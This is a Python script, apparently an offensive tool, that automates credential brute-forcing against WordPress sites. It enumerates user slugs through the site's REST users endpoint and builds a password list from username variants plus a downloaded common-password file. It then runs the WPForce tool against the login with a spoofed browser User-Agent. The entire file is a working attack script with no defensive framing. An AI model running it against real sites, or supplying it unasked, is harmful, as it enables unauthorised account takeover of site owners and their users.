import argparse
import requests
import subprocess
import os
import sys
import re
from urllib.parse import urlparse, urlunparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_working_scheme(domain):
    for scheme in ["https", "http"]:
        try:
            url = f"{scheme}://{domain}/wp-json/wp/v2/users"
            r = requests.get(url, timeout=5, verify=False)
            if r.status_code == 200:
                return scheme
        except requests.RequestException:
            continue
    raise Exception(f"Could not connect to {domain} with http or https.")

def normalize_domain(raw):
    parsed = urlparse(raw if "://" in raw else f"http://{raw}")
    if not parsed.scheme:
        parsed = parsed._replace(scheme="http")
    return urlunparse(parsed).rstrip('/')

def split_username(username):
    """
    Split username into components using delimiters and camelCase.
    """
    # Lowercase version
    lowered = username.lower()

    # Split by common delimiters
    delimiter_parts = re.split(r'[-_.\d]+', lowered)

    # Split camelCase (preserves original capitalization)
    camel_parts = re.findall(r'[A-Z]?[a-z]+', username)

    # Combine all and deduplicate
    all_parts = set([p.lower() for p in delimiter_parts + camel_parts if p])
    return list(all_parts)

def generate_common_passwords(username):
    parts = split_username(username)

    patterns = set()

    for part in parts:
        patterns.update([
            part,
            part + "123",
            part + "1234",
            part + "@123",
            part + "2024",
            part + "2025",
            part.capitalize() + "123",
            part.capitalize() + "@123"
        ])

    # Add original username variations too
    patterns.update([
        username.lower(),
        username.lower() + "123",
        username.lower() + "@123",
        username + "123",
        username + "@123",
    ])

    return list(patterns)

def fetch_usernames(domain, output_file="usr.txt"):
    scheme = get_working_scheme(domain)
    base_url = f"{scheme}://{domain}"
    users_url = f"{base_url}/wp-json/wp/v2/users"

    try:
        r = requests.get(users_url, timeout=10, verify=False)
        r.raise_for_status()
        usernames = [user['slug'] for user in r.json()]
        with open(output_file, 'w') as f:
            for username in usernames:
                f.write(username + '\n')
        print(f"[+] Saved {len(usernames)} usernames to {output_file}")
        return usernames, scheme
    except Exception as e:
        print(f"[!] Error fetching usernames: {e}")
        sys.exit(1)

def download_passwords(base_password_file, usernames, domain_slug):
    new_password_file = f"pwd_{domain_slug}.txt"
    if not os.path.exists('pwd.txt'):
        print("[*] Downloading top 1000 passwords...")
        url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/common-passwords-win.txt"
        r = requests.get(url)
        r.raise_for_status()
        common_passwords = r.text.strip().splitlines()
    else:
        with open('pwd.txt', 'r') as f:
            common_passwords = f.read().strip().splitlines()

    extra_passwords = []
    for username in usernames:
        extra_passwords.extend(generate_common_passwords(username))

    full_password_list = list(dict.fromkeys(extra_passwords + common_passwords))  # no duplicates

    with open(new_password_file, 'w') as f:
        f.write('\n'.join(full_password_list))

    print(f"[+] Saved passwords to {new_password_file} (total: {len(full_password_list)})")
    return new_password_file

def run_wpforce(domain, scheme, user_file, password_file, user_agent):
    wpforce_path = "./WPForce/wpforce.py"
    if not os.path.exists(wpforce_path):
        print("[!] WPForce not found. Clone it with:\n    git clone https://github.com/n00py/WPForce.git")
        sys.exit(1)

    base_url = f"{scheme}://{domain}/"

    command = [
        "python2", wpforce_path,
        "-i", os.path.abspath(user_file),
        "-w", os.path.abspath(password_file),
        "-u", base_url,
        "-a", user_agent
    ]
    print(f"[*] Running WPForce against {base_url} using User-Agent: {user_agent}")
    subprocess.run(command)


def main():
    parser = argparse.ArgumentParser(description="📦 WordPress Brute-force Wrapper (WPForce-based)")
    
    # Define arguments
    parser.add_argument("domain", help="Target WordPress domain (without https://)")
    parser.add_argument(
        "--agent",
        help="Custom User-Agent string to use for requests",
        default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115 Safari/537.36"
    )

    # Parse arguments
    args = parser.parse_args()

    # Proceed with the rest of the code
    domain_slug = re.sub(r'\W+', '_', args.domain)
    usernames, scheme = fetch_usernames(args.domain)
    password_file = download_passwords("pwd.txt", usernames, domain_slug)
    run_wpforce(args.domain, scheme, "usr.txt", password_file, args.agent)

    # Cleanup
    if os.path.exists(password_file):
        os.remove(password_file)
        print(f"[🧹] Cleaned up password file: {password_file}")

if __name__ == "__main__":
    main()
